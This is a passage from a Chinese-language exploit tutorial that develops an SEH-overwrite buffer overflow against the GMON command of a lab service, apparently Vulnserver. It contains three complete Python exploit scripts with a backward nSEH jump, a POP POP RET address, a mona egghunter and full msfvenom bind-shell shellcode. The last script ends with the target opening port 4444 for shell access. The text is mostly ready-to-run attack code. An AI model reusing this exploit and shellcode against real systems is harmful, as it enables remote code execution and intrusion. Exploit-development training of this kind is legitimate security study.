下一步就是用一条跳转指令来改变这4个B的位置，从而将我的shellcode重定向。然而，如上所述，我不能使用D的缓冲区，因为它只有28字节长。即使对一个egghunter来说，这也是不够的，因为它需要32字节的空间。由于A的缓冲区位于4个B的缓冲区的正上方，我必须要后跳。因此，我还需要做一个
"长跳"，因为等价的操作码有5个字节长。这不适合只有4个字节空间的nSEH。并且我需要向后跳转了50个字节。下面是我使用的代码。
    #!/usr/bin/python
    import os
    import sys
    import socket
    host = "192.168.1.129"
    port = 9999
    nseh = "\xEB\xCE\x90\x90"   # Jump back 50 bytes for egghunter
    seh = "\xB4\x10\x50\x62"    # POP POP RET from essfunc.dll
    buffer = "A"*3495
    buffer += nseh
    buffer += seh
    buffer += "D"*(5000-len(buffer))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    print "[*] Sending exploit..."
    s.send("GMON /.:/" + buffer)
    print s.recv(1024)
    s.close()
从这里可以看出，负向跳跃起了作用。下一步将是把egghunter代码放在这个位置。
这里我使用了！！mona egg -t CAPT来生成egghunter。
在使用egghunter之前，我首先需要确定egghunter代码之前的偏移量（A的数量）。为了做到这一点，我做了一个简单的计算：原3495字节的A+2字节的后跳操作码-50字节的后跳长度=3447字节的A。以下是更新后的代码。
    #!/usr/bin/python
    import os
    import sys
    import socket
    host = "192.168.1.129"
    port = 9999
    nseh = "\xEB\xCE\x90\x90"   # Jump back 50 bytes for egghunter
    seh = "\xB4\x10\x50\x62"    # POP POP RET from essfunc.dll
    # Egg: CAPT
    # Size: 32 bytes
    egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x43\x41\x50\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
    buffer = "A"*3447
    buffer += egghunter
    buffer += "A"*(3495-len(buffer))
    buffer += nseh
    buffer += seh
    buffer += "D"*(5000-len(buffer))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    print "[*] Sending exploit..."
    s.send("GMON /.:/" + buffer)
    print s.recv(1024)
    s.close()
发现我们的计算是正确的，当前的指令指向了egghunter的起点。
然后我用MSFvenom生成了一个shellcode。
由于剩余的A的缓冲区仍然很大，我决定将egg/tag和shellcode放在GMON命令之后。
    #!/usr/bin/python
    import os
    import sys
    import socket
    host = "192.168.1.129"
    port = 9999
    nseh = "\xEB\xCE\x90\x90"   # Jump back 50 bytes for egghunter
    seh = "\xB4\x10\x50\x62"    # POP POP RET from essfunc.dll
    # Egg: CAPT
    # Size: 32 bytes
    egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x43\x41\x50\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
    # msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
    # Payload size: 355 bytes
    shellcode = ("\xdb\xc8\xd9\x74\x24\xf4\xb8\x4f\x0d\xf8\xd8\x5d\x29\xc9\xb1"
    "\x53\x31\x45\x17\x83\xc5\x04\x03\x0a\x1e\x1a\x2d\x68\xc8\x58"
    "\xce\x90\x09\x3d\x46\x75\x38\x7d\x3c\xfe\x6b\x4d\x36\x52\x80"
    "\x26\x1a\x46\x13\x4a\xb3\x69\x94\xe1\xe5\x44\x25\x59\xd5\xc7"
    "\xa5\xa0\x0a\x27\x97\x6a\x5f\x26\xd0\x97\x92\x7a\x89\xdc\x01"
    "\x6a\xbe\xa9\x99\x01\x8c\x3c\x9a\xf6\x45\x3e\x8b\xa9\xde\x19"
    "\x0b\x48\x32\x12\x02\x52\x57\x1f\xdc\xe9\xa3\xeb\xdf\x3b\xfa"
    "\x14\x73\x02\x32\xe7\x8d\x43\xf5\x18\xf8\xbd\x05\xa4\xfb\x7a"
    "\x77\x72\x89\x98\xdf\xf1\x29\x44\xe1\xd6\xac\x0f\xed\x93\xbb"
    "\x57\xf2\x22\x6f\xec\x0e\xae\x8e\x22\x87\xf4\xb4\xe6\xc3\xaf"
    "\xd5\xbf\xa9\x1e\xe9\xdf\x11\xfe\x4f\x94\xbc\xeb\xfd\xf7\xa8"
    "\xd8\xcf\x07\x29\x77\x47\x74\x1b\xd8\xf3\x12\x17\x91\xdd\xe5"
    "\x58\x88\x9a\x79\xa7\x33\xdb\x50\x6c\x67\x8b\xca\x45\x08\x40"
    "\x0a\x69\xdd\xfd\x02\xcc\x8e\xe3\xef\xae\x7e\xa4\x5f\x47\x95"
    "\x2b\x80\x77\x96\xe1\xa9\x10\x6b\x0a\xc4\xbc\xe2\xec\x8c\x2c"
    "\xa3\xa7\x38\x8f\x90\x7f\xdf\xf0\xf2\xd7\x77\xb8\x14\xef\x78"
    "\x39\x33\x47\xee\xb2\x50\x53\x0f\xc5\x7c\xf3\x58\x52\x0a\x92"
    "\x2b\xc2\x0b\xbf\xdb\x67\x99\x24\x1b\xe1\x82\xf2\x4c\xa6\x75"
    "\x0b\x18\x5a\x2f\xa5\x3e\xa7\xa9\x8e\xfa\x7c\x0a\x10\x03\xf0"
    "\x36\x36\x13\xcc\xb7\x72\x47\x80\xe1\x2c\x31\x66\x58\x9f\xeb"
    "\x30\x37\x49\x7b\xc4\x7b\x4a\xfd\xc9\x51\x3c\xe1\x78\x0c\x79"
    "\x1e\xb4\xd8\x8d\x67\xa8\x78\x71\xb2\x68\x98\x90\x16\x85\x31"
    "\x0d\xf3\x24\x5c\xae\x2e\x6a\x59\x2d\xda\x13\x9e\x2d\xaf\x16"
    "\xda\xe9\x5c\x6b\x73\x9c\x62\xd8\x74\xb5")
    buffer = "CAPTCAPT"
    buffer += shellcode
    buffer += "A"*(3447-len(buffer))
    buffer += egghunter
    buffer += "A"*(3495-len(buffer))
    buffer += nseh
    buffer += seh
    buffer += "D"*(5000-len(buffer))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    print "[*] Sending exploit..."
    s.send("GMON /.:/" + buffer)
    print s.recv(1024)
    s.close()
以下是执行流程。
在执行最后的漏洞代码时，egghunter在GMON命令后成功定位了egg/tag和我的shellcode。
我们发现 ，shellcode起作用了，目标机在4444/tcp上产生了一个 "监听 "端口。
最后要做的是连接到新打开的端口，获得一个shell访问权限。